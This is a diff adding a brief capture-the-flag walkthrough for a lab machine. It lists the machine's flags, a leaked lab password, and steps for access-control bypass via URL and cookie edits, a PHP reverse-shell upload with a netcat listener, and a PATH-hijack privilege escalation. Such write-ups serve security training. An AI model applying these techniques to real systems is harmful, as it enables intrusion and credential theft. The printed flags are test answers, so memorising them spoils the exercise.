@@ -1,0 +1,42 @@
+Target IP: 10.129.163.25
+
+Attacking IP: 10.10.14.239
+
+user flag:
+f2c74ee8db7983851ab2a96a44eb7981
+
+root flag:
+af13b0bee69f8a877c3faf667f7beacf
+
+Steps:
+1. nmap -sV -p- 10.129.163.25
+2. Add to /etc/hosts
+3. Intercept web traffic with Burpsuite
+4. Go to login page oopsie.htb/cdn-cgi/login
+5. Login as Guest
+6. Go to Account, in the URL, change id=1
+7. Open Developer Console, under Cookies, change 2233 -> 34322 (admin)
+8. Create a reverse shell in php
+9. Upload reverse shell in Uploads tab
+10. gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u oopsie.htb
+Found Uploads directory
+11. Start netcat
+12. Go to oopsie.htb/uploads/revshell.php
+13. Start an interactive shell
+14. cat /home/robert/user.txt
+15. cat /var/www/html/cdn-cgi/login/db.php
+ 	User : robert    Password : M3g4C0rpUs3r!
+16. ssh robert@10.129.163.25
+17. sudo -l
+18. id
+19. find / -group bugtracker 2>/dev/null
+20. bugtracker
+21. ls -la /usr/bin/bugtracker
+22. file /usr/bin/bugtracker
+23. cd /tmp
+24. echo /bin/sh > cat
+25. chmod +x cat
+26. export PATH=/tmp:$PATH
+27. bugtracker
+28. /bin/cat /root/root.txt
+
